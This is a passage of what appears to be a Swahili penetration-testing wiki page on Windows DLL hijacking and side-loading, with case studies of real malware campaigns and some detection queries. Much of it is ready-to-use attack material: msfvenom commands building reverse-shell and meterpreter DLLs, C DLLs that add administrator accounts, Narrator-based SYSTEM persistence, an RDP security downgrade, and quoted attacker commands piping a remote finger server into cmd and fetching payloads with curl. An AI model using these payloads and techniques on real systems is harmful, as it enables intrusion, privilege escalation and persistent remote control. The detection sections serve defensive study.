- Hatua ya 3 huthibitisha muktadha wa utekelezaji (kwa mfano, parent inayotarajiwa `svchost.exe` kutoka Task Scheduler) kabla ya kupakia RAT DLL/export ya mwisho.

Mawazo ya kutafuta:
- **.NET executables** zilizosainiwa au halali kwa njia nyingine, zinazoendeshwa pamoja na faili za **`.config`** zinazotiliwa shaka katika maeneo ambayo watumiaji wanaweza kuandika.
- Faili za `.config` zilizo na **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`**, au **`etwEnable enabled="false"`**.
- Scheduled tasks zinazoanzisha tena binaries za update zilizobadilishwa majina kutoka **`%LOCALAPPDATA%`** au saraka za programu maalum za `\bin\update\`.
- Mifuatano ya parent/child ambapo scheduled task huanzisha host ya .NET inayoaminika, ambayo mara moja hupakia assemblies zisizotoka kwa vendor kutoka kwenye saraka yake yenyewe.

#### Vighairi vya DLL search order vilivyo kwenye nyaraka za Windows

Nyaraka za Windows zinataja vighairi fulani vya DLL search order ya kawaida:

- Mfumo unapokutana na **DLL yenye jina sawa na ile ambayo tayari imepakiwa kwenye memory**, huruka utafutaji wa kawaida. Badala yake, hukagua redirect na manifest kabla ya kutumia DLL ambayo tayari iko kwenye memory kama chaguo la mwisho. **Katika hali hii, mfumo hautafuti DLL**.
- Ikiwa DLL inatambuliwa kuwa **known DLL** kwa toleo la sasa la Windows, mfumo hutumia toleo lake la known DLL, pamoja na DLL zozote tegemezi, **bila kufanya utafutaji**. Registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** ina orodha ya known DLL hizi.
- **DLL ikiwa na dependencies**, utafutaji wa DLL tegemezi hufanywa kana kwamba zimetajwa kwa **majina ya module** pekee, bila kujali kama DLL ya awali ilitambuliwa kwa kutumia full path.

### Kupandisha Haki za Ufikiaji

**Mahitaji**:

- Tambua mchakato unaotumia au utakaotumia **haki tofauti** (horizontal au lateral movement), na ambao **unakosa DLL**.
- Hakikisha una **ruhusa ya kuandika** kwenye **saraka** yoyote ambamo **DLL** itatafutwa. Eneo hili linaweza kuwa saraka ya executable au saraka iliyo ndani ya system path.

Masharti haya si ya kawaida kwa chaguo-msingi: executable zenye haki za juu kwa kawaida hazikosi dependencies za DLL, na watumiaji wa kawaida kwa kawaida hawawezi kuandika kwenye saraka za system search-path. Hata hivyo, mazingira yaliyosanidiwa vibaya yanaweza kufichua hali zote mbili.\
Mahitaji yakitimia, angalia mradi wa [UACME](https://github.com/hfiref0x/UACME). Ingawa lengo lake kuu ni UAC bypass, una PoCs za DLL hijacking kwa matoleo mahususi ya Windows ambazo mara nyingi zinaweza kurekebishwa ili zitumie saraka inayoweza kuandikika uliyoipata.

Kumbuka kwamba unaweza **kuangalia ruhusa zako kwenye folda** kwa kufanya:<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

Na **kagua ruhusa za folda zote zilizo ndani ya PATH**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Unaweza pia kuangalia imports za executable na exports za dll kwa kutumia:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

Kwa mwongozo kamili wa jinsi ya **kutumia vibaya DLL Hijacking ili kuongeza privileges** ukiwa na ruhusa za kuandika kwenye folda ya **System Path**, angalia:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zana za kiotomatiki

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)itaangalia ikiwa una ruhusa za kuandika kwenye folda yoyote iliyo ndani ya system PATH.\
Zana nyingine za kiotomatiki zinazovutia za kugundua udhaifu huu ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._

### Mfano

Ukigundua hali inayoweza kutumiwa vibaya, mojawapo ya mambo muhimu zaidi ili kuitumia kwa mafanikio ni **kutengeneza DLL inayosafirisha angalau functions zote ambazo executable ita-import kutoka humo**. Hata hivyo, kumbuka kwamba DLL Hijacking inaweza kusaidia [kuongeza privileges kutoka kiwango cha Medium Integrity hadi High **(kupita UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) au kutoka[ **High Integrity hadi SYSTEM**](../index.html#from-high-integrity-to-system)**.** Unaweza kupata mfano wa **jinsi ya kutengeneza DLL halali** ndani ya utafiti huu wa DLL hijacking unaolenga DLL hijacking kwa ajili ya execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Zaidi ya hayo, katika **sehemu inayofuata** utapata baadhi ya **code za msingi za DLL** zinazoweza kuwa muhimu kama **templates** au kwa kutengeneza **DLL yenye functions zisizohitajika zilizowekwa kwenye export**.

## **Kutengeneza na ku-compile DLLs**

### **DLL Proxifying**

Kimsingi, **DLL proxy** ni DLL inayoweza **kutekeleza code yako hasidi inapopakiwa**, lakini pia **kuonyesha** na **kufanya kazi** kama **inavyotarajiwa** kwa **kuelekeza calls zote kwenye library halisi**.

Ukitumia zana ya [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus), unaweza **kubainisha executable na kuchagua library** unayotaka ku-proxify, kisha **kutengeneza DLL iliyoproxifyiwa**, au **kubainisha DLL** na **kutengeneza DLL iliyoproxifyiwa**.

### **Meterpreter**

**Pata rev shell (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Pata meterpreter (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**Unda mtumiaji (x86 sikuona toleo la x64):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### Yako mwenyewe

Katika hali nyingi, DLL unayokompile lazima **iexport kila function inayoimportiwa na process lengwa**. Ikiwa export inayohitajika haipo, binary haiwezi kuirejelea na exploit hushindwa.

<details>
<summary>Kiolezo cha C DLL (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>Mfano wa DLL ya C++ wenye uundaji wa mtumiaji</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>DLL mbadala ya C yenye sehemu ya kuingilia ya thread</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### NativeAOT DLL yenye uanzishaji unaochochewa na export

**.NET NativeAOT shared library** inayojitegemea inaweza kutumika kama native DLL iliyopandikizwa bila kutekeleza `DllMain` moja kwa moja. Export static C# methods kwa kutumia `[UnmanagedCallersOnly(EntryPoint = "...")]`; host ya native inapoiita mojawapo ya compiler-generated entry points hizi, NativeAOT huanzisha module na method ya `[ModuleInitializer]` hutekelezwa kabla ya mwili wa C# uli-exportiwa. Output haihitaji .NET runtime isakinishwe kando.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

DLL bado inahitaji **export names na signatures zinazooana na ABI** ambazo host iliyochaguliwa kwa kweli huziita. Stubs ndogo zinaweza kutosha kuchochea uanzishaji, lakini exports zinazokosekana zinaweza kuzuia kupakia, na signature isiyo sahihi inaweza kuharibu call. Orodhesha imports za host na uthibitishe matokeo kwa `dumpbin /exports payload.dll` kabla ya kubadilisha jina la output liwe jina la dependency linalotarajiwa na host.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>Minimal NativeAOT exported DLL</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

Sanidi mradi kama maktaba asilia ya pamoja ya Windows inayojitegemea:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

Weka DLL iliyopewa jina jipya kando ya executable hatarishi iliyonakiliwa na uanzishe host kupitia njia ya msimbo inayoita export inayooana. Mbinu hii ya initializer huepusha kuweka kazi changamano moja kwa moja ndani ya `DllMain`, lakini masharti ya awali ya sideload hayabadiliki: loader lazima itafute dependency kwa jina, ichague saraka ya programu, na isiipate kwanza kupitia KnownDLLs, module ambayo tayari imepakiwa, uelekezaji upya wa SxS, au flags zilizowekewa vikwazo za `LOAD_LIBRARY_SEARCH_*`.<sup>[[26]](#references)[[30]](#references)</sup>

Kwa templates za kawaida za native, tazama [payload za C za Windows](../windows-c-payloads.md). First stage iliyosideloadiwa inaweza baadaye kutekeleza [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe), lakini hiyo ni mbinu tofauti ya injection, si sehemu ya utatuzi wa DLL.

## Utambuzi: Upakiaji wa library kupitia DLL masquerading

Elastic Defend 9.5.0 huongeza maelezo kwenye tukio la upakiaji wa library kwa kuweka `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"` wakati faili iliyopakiwa haijasainiwa na Microsoft na jina lake la faili linagongana na orodha iliyohifadhiwa kwa muda ya majina ya Windows/system DLL za Elastic. Hii huhamishia uchanganuzi wa orodha ya majina ya faili, mahali pa mfumo na saini kwenye kihisi cha endpoint; kwa hiyo, EQL ya msingi inaweza kurahisishwa kuwa:<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Chukulia enrichment kama pivot yenye thamani kubwa, si uthibitisho wa pekee. Ongeza kiwango cha uhakika pale host iliyosainiwa inapopakia DLL kutoka kwenye saraka yake **inayoweza kuandikwa na mtumiaji**, DLL hiyo ikiwa haijasainiwa/haijaaminiwa, na `dll.Ext.relative_file_creation_time` ikionyesha kuwa iliundwa muda mfupi kabla ya kupakiwa. Weka vizuizi kwa mchanganyiko sahihi wa publisher + mchakato wa host + njia ya usakinishaji; usizuie jina linalogongana la DLL kote ulimwenguni kwa sababu installers na applications halali zinaweza kusambaza libraries za faragha zenye majina yanayofanana na ya mfumo.<sup>[[26]](#references)</sup>

Kwenye sensors zisizo na enrichment hiyo, kadiria tabia hiyo kwa kuhusisha jina la DLL linalogongana na njia ya kupakia isiyo ya mfumo, sahihi ya Microsoft isiyokuwepo/isiyoaminika, na muda mfupi kati ya kuundwa kwa faili na kupakiwa kwake. Hili linahitaji orodha ya majina ya DLL inayodumishwa na vizuizi finyu kwa `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS`, na njia nyingine za usambazaji zilizoidhinishwa.<sup>[[26]](#references)</sup>

## Uchunguzi wa Kisa: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe bado hukagua DLL ya localization inayotegemea lugha na yenye njia inayotabirika wakati wa kuanza; DLL hii inaweza kutekwa kwa ajili ya utekelezaji wa msimbo wowote na persistence.<sup>[[7]](#references)</sup>

Mambo muhimu
- Njia ya ukaguzi (build za sasa): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Njia ya zamani (build za awali): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Ikiwa DLL inayodhibitiwa na mshambulizi na inayoweza kuandikwa ipo kwenye njia ya OneCore, hupakiwa na `DllMain(DLL_PROCESS_ATTACH)` hutekelezwa. Hakuna exports zinazohitajika.

Ugunduzi kwa Procmon
- Chuja kwa: `Process Name is Narrator.exe` na `Operation is Load Image` au `CreateFile`.
- Anzisha Narrator na uangalie jaribio la kupakia kutoka kwenye njia iliyo hapo juu.

DLL ya chini kabisa
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC bila kutoa sauti
- Hijack ya moja kwa moja inaweza kutoa sauti/kuangazia UI. Ili kufanya kazi kimyakimya, wakati wa attach orodhesha threads za Narrator, fungua thread kuu (`OpenThread(THREAD_SUSPEND_RESUME)`) kisha uitishe kwa `SuspendThread`; endelea kwenye thread yako mwenyewe. Tazama PoC kwa msimbo kamili.<sup>[[8]](#references)</sup>

Kuanzisha na kudumisha kupitia usanidi wa Accessibility
- Muktadha wa mtumiaji (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Kwa kutumia yaliyo hapo juu, kuanzisha Narrator hupakia DLL iliyopandikizwa. Ukiwa kwenye secure desktop (skrini ya kuingia), bonyeza CTRL+WIN+ENTER ili kuanzisha Narrator; DLL yako hutekelezwa kama SYSTEM kwenye secure desktop.

Utekelezaji wa SYSTEM unaoanzishwa na RDP (kusogea kando)
- Ruhusu safu ya usalama ya kawaida ya RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Unganisha kwa RDP kwenye host, kisha kwenye skrini ya kuingia bonyeza CTRL+WIN+ENTER ili kuanzisha Narrator; DLL yako hutekelezwa kama SYSTEM kwenye secure desktop.
- Utekelezaji husimama kipindi cha RDP kinapofungwa—hamishia mchakato kwa inject/migrate mara moja.

Bring Your Own Accessibility (BYOA)
- Unaweza kunakili ingizo la registry la zana iliyojengewa ndani ya Accessibility (AT) (kwa mfano, CursorIndicator), kulihariri ili lielekeze kwenye binary/DLL yoyote, kuliingiza, kisha kuweka `configuration` iwe jina la AT hiyo. Hii hutumia mfumo wa Accessibility kama wakala wa kutekeleza chochote.

Maelezo
- Kuandika ndani ya `%windir%\System32` na kubadilisha thamani za HKLM kunahitaji haki za admin.
- Mantiki yote ya payload inaweza kuwekwa ndani ya `DLL_PROCESS_ATTACH`; hakuna exports zinazohitajika.

## Uchunguzi Kifani: CVE-2025-1729 - Kupandisha Haki kwa Kutumia TPQMAssistant.exe

Uchunguzi huu unaonyesha **Phantom DLL Hijacking** katika TrackPoint Quick Menu ya Lenovo (`TPQMAssistant.exe`), inayofuatiliwa kama **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Maelezo ya Athari

- **Kijenzi**: `TPQMAssistant.exe` kilicho katika `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` hutekelezwa kila siku saa 9:30 AM katika muktadha wa mtumiaji aliyeingia.
- **Ruhusa za Saraka**: Inaweza kuandikwa na `CREATOR OWNER`, hivyo kuruhusu watumiaji wa ndani kuweka faili zozote.
- **Tabia ya Utafutaji wa DLL**: Hujaribu kupakia `hostfxr.dll` kwanza kutoka kwenye working directory yake na huandika "NAME NOT FOUND" kwenye logi ikiwa haipo, ikionyesha kuwa utafutaji kwenye saraka ya ndani una kipaumbele.

### Utekelezaji wa Exploit

Mshambulizi anaweza kuweka stub hasidi ya `hostfxr.dll` kwenye saraka hiyo hiyo, akitumia DLL inayokosekana ili kutekeleza msimbo katika muktadha wa mtumiaji:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### Mtiririko wa Mashambulizi

1. Kama mtumiaji wa kawaida, weka `hostfxr.dll` kwenye `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Subiri scheduled task iendeshwe saa 9:30 AM katika muktadha wa mtumiaji wa sasa.
3. Ikiwa msimamizi ameingia wakati task inaendeshwa, DLL hasidi huendeshwa katika session ya msimamizi kwa kiwango cha uadilifu wa kati.
4. Unganisha mbinu za kawaida za UAC bypass ili kupata haki za SYSTEM kutoka kiwango cha uadilifu wa kati.

## Uchunguzi wa Kisa: MSI CustomAction Dropper + DLL Side-Loading kupitia Host Iliyosainiwa (wsc_proxy.exe)

Wahusika wa vitisho mara nyingi huunganisha droppers za MSI na DLL side-loading ili kutekeleza payloads chini ya mchakato unaoaminika na uliosainiwa.<sup>[[10]](#references)</sup>

Muhtasari wa mnyororo
- Mtumiaji anapakua MSI. CustomAction huendeshwa kimya wakati wa usakinishaji wa GUI (kwa mfano, LaunchApplication au kitendo cha VBScript), na kujenga upya hatua inayofuata kutoka kwa rasilimali zilizopachikwa.
- Dropper huandika EXE halali iliyosainiwa na DLL hasidi kwenye saraka moja (jozi ya mfano: wsc_proxy.exe iliyosainiwa na Avast + wsc.dll inayodhibitiwa na mshambuliaji).
- EXE iliyosainiwa inapoanzishwa, mpangilio wa utafutaji wa DLL wa Windows hupakia kwanza wsc.dll kutoka kwenye saraka ya kufanya kazi, na kutekeleza msimbo wa mshambuliaji chini ya mchakato mkuu uliosainiwa (ATT&CK T1574.001).

Uchambuzi wa MSI (vitu vya kutafuta)
- Jedwali la CustomAction:
  - Tafuta maingizo yanayoendesha executables au VBScript. Mfano wa muundo unaotia shaka: LaunchApplication inayotekeleza faili iliyopachikwa chinichini.
  - Katika Orca (Microsoft Orca.exe), kagua jedwali za CustomAction, InstallExecuteSequence na Binary.
- Payloads zilizopachikwa/zilizogawanywa kwenye MSI CAB:
  - Utoaji wa kiutawala: msiexec /a package.msi /qb TARGETDIR=C:\out
  - Au tumia lessmsi: lessmsi x package.msi C:\out
  - Tafuta vipande vidogo vingi vinavyounganishwa na kufumbuliwa na CustomAction ya VBScript. Mtiririko wa kawaida:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Practical sideloading kwa kutumia wsc_proxy.exe
- Weka faili hizi mbili kwenye folda moja:
  - wsc_proxy.exe: host halali iliyosainiwa (Avast). Mchakato hujaribu kupakia wsc.dll kwa jina kutoka kwenye saraka yake.
  - wsc.dll: DLL ya mshambuliaji. Ikiwa exports maalum hazihitajiki, DllMain inaweza kutosha; vinginevyo, tengeneza proxy DLL na uelekeze exports zinazohitajika kwenye library halisi huku ukiendesha payload katika DllMain.
- Tengeneza payload ndogo ya DLL:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- Kwa mahitaji ya export, tumia framework ya proxying (kwa mfano, DLLirant/Spartacus) ili kutengeneza DLL ya forwarding ambayo pia hutekeleza payload yako.

- Mbinu hii hutegemea utatuzi wa majina ya DLL unaofanywa na host binary. Ikiwa host hutumia absolute paths au safe loading flags (kwa mfano, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack inaweza kushindwa.
- KnownDLLs, SxS, na forwarded exports zinaweza kuathiri precedence na zinapaswa kuzingatiwa wakati wa kuchagua host binary na export set.

## Triad zilizosainiwa + payloads zilizosimbwa (uchunguzi wa ShadowPad)

Check Point ilieleza jinsi Ink Dragon inavyosambaza ShadowPad kwa kutumia **triad ya faili tatu** ili kufanana na software halali huku payload kuu ikiwa imesimbwa kwenye diski:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – vendors kama AMD, Realtek, au NVIDIA hutumiwa vibaya (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Washambuliaji hubadilisha jina la executable lifanane na Windows binary (kwa mfano `conhost.exe`), lakini Authenticode signature hubaki halali.
2. **Malicious loader DLL** – huwekwa kando ya EXE ikiwa na jina linalotarajiwa (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL kwa kawaida ni MFC binary iliyofichwa kwa kutumia ScatterBrain framework; kazi yake pekee ni kupata encrypted blob, kuifungua, na kufanya reflective mapping ya ShadowPad.
3. **Encrypted payload blob** – mara nyingi huhifadhiwa kama `<name>.tmp` kwenye directory hiyo hiyo. Baada ya kufanya memory-mapping ya payload iliyofunguliwa, loader hufuta faili la TMP ili kuharibu ushahidi wa forensics.

Maelezo ya tradecraft:

* Kubadilisha jina la EXE iliyosainiwa (huku `OriginalFileName` ya awali ikibaki kwenye PE header) huiwezesha kujifanya Windows binary huku ikihifadhi vendor signature. Kwa hiyo, iga tabia ya Ink Dragon ya kuweka binaries zinazoonekana kama `conhost.exe` ambazo kwa kweli ni AMD/NVIDIA utilities.
* Kwa kuwa executable hubaki trusted, controls nyingi za allowlisting zinahitaji tu malicious DLL yako iwekwe kando yake. Lenga kubinafsisha loader DLL; kwa kawaida parent iliyosainiwa inaweza kuendeshwa bila kubadilishwa.
* Decryptor ya ShadowPad inahitaji TMP blob iwe kando ya loader na iwe writable ili iweze kufuta faili baada ya mapping. Iache directory ikiwa writable hadi payload ipakie; ikiwa kwenye memory, faili la TMP linaweza kufutwa kwa usalama kwa OPSEC.

### Mnyororo wa LOLBAS stager + staged archive sideloading (finger → tar/curl → WMI)

Operators huunganisha DLL sideloading na LOLBAS ili artifact pekee maalum iliyo kwenye diski iwe malicious DLL iliyo kando ya EXE inayoaminika:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** PowerShell iliyofichwa huanzisha `cmd.exe /c`, hupata commands kutoka kwa Finger server, na kuzipeleka kwa `cmd`:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` hupata maandishi kupitia TCP/79; `| cmd` hutekeleza jibu la seva, hivyo kuwawezesha operators kubadilisha second stage upande wa seva.

- **Upakuaji/utoaji uliojengewa ndani:** Pakua archive yenye kiendelezi kisicho hatari, ifungue, kisha weka lengo la sideload pamoja na DLL chini ya folda nasibu ya `%LocalAppData%`:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` huficha maendeleo na kufuata uelekezaji upya; `tar -xf` hutumia tar iliyojengewa ndani ya Windows.

- **WMI/CIM launch:** Anzisha EXE kupitia WMI ili telemetry ionyeshe mchakato ulioundwa na CIM wakati inapakia DLL iliyo kwenye eneo hilohilo:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - Hufanya kazi na binaries zinazopendelea kutumia DLL za ndani (kwa mfano, `intelbq.exe`, `nearby_share.exe`); payload (kwa mfano, Remcos) huendeshwa chini ya jina linaloaminika.

- **Hunting:** Toa tahadhari kuhusu `forfiles` pale `/p`, `/m`, na `/c` zinapotumika pamoja; hali hii si ya kawaida nje ya scripts za usimamizi.


## Tafiti ya Kesi: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Uvamizi wa hivi karibuni wa Lotus Blossom ulitumia vibaya mnyororo wa sasisho unaoaminika kusambaza dropper iliyofungwa kwa NSIS, iliyoweka DLL sideload pamoja na payloads zinazoishi kikamilifu kwenye kumbukumbu.<sup>[[13]](#references)</sup>

Mtiririko wa mbinu
- `update.exe` (NSIS) huunda `%AppData%\Bluetooth`, huiweka alama ya **HIDDEN**, hutupa Bitdefender Submission Wizard `BluetoothService.exe` iliyopewa jina jipya, `log.dll` hasidi, na blob iliyosimbwa kwa njia fiche `BluetoothService`, kisha huzindua EXE.
- EXE ya host hu-import `log.dll` na kuita `LogInit`/`LogWrite`. `LogInit` hupakia blob kwa mmap; `LogWrite` huitoa usimbaji fiche kwa kutumia mkondo maalum unaotegemea LCG (constanti **0x19660D** / **0x3C6EF35F**, nyenzo ya ufunguo iliyotokana na hash ya awali), huandika shellcode ya maandishi wazi juu ya buffer, huachilia vitu vya muda, kisha hurukia humo.
- Ili kuepuka IAT, loader hutatua API kwa ku-hash majina ya export kwa kutumia **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, kisha kutumia Murmur-style avalanche (**0x85EBCA6B**) na kulinganisha na hash za lengwa zilizotiwa chumvi.

Shellcode kuu (Chrysalis)
- Hutoa usimbaji fiche wa main module inayofanana na PE kwa kurudia add/XOR/sub kwa kutumia ufunguo `gQ2JR&9;` katika mizunguko mitano, kisha hupakia `Kernel32.dll` kwa njia ya dynamic → `GetProcAddress` ili kukamilisha utatuzi wa import.
- Hujenga upya mifuatano ya majina ya DLL wakati wa utekelezaji kupitia mabadiliko ya bit-rotate/XOR kwa kila herufi, kisha hupakia `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Hutumia resolver ya pili inayopitia **PEB → InMemoryOrderModuleList**, kuchanganua kila jedwali la export katika blocks za baiti 4 kwa kutumia Murmur-style mixing, na kutumia `GetProcAddress` tu ikiwa hash haipatikani.

Configuration iliyopachikwa na C2
- Config iko ndani ya faili iliyotupwa ya `BluetoothService` kwenye **offset 0x30808** (ukubwa **0x980**) na hutolewa usimbaji fiche wa RC4 kwa kutumia ufunguo `qwhvb^435h&*7`, na kufichua URL ya C2 na User-Agent.
- Beacons huunda wasifu wa host uliotenganishwa kwa nukta, huweka tag `4Q` mwanzoni, kisha huusimba kwa RC4 kwa kutumia ufunguo `vAuig34%^325hGV` kabla ya `HttpSendRequestA` kupitia HTTPS. Majibu hutolewa usimbaji fiche wa RC4 na kushughulikiwa kwa kutumia tag switch (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + hali za uhamishaji wa vipande).
- Hali ya utekelezaji hudhibitiwa na CLI args: bila args = kusakinisha persistence (service/Run key) inayoelekeza kwenye `-i`; `-i` huzindua upya yenyewe kwa kutumia `-k`; `-k` huruka usakinishaji na kuendesha payload.

Loader mbadala iliyoonekana
- Uvamizi huohuo ulitupa Tiny C Compiler na kutekeleza `svchost.exe -nostdlib -run conf.c` kutoka `C:\ProgramData\USOShared\`, huku `libtcc.dll` ikiwa karibu nayo. C source iliyotolewa na mshambuliaji ilikuwa na shellcode iliyopachikwa, ikakusanywa na kuendeshwa kwenye kumbukumbu bila kuandika PE kwenye diski. Iga kwa kutumia:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

